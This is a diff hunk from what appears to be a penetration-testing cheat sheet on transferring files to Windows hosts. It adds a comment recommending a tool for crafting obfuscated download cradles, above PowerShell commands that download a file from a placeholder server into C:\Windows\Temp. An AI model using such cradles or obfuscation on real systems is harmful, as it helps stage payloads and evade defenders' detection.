@@ -362,6 +362,8 @@ ftp -v -n -s:ftp.txt
 Powershell
 
 ```powershell
+#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles
+
 Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
 
 (New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
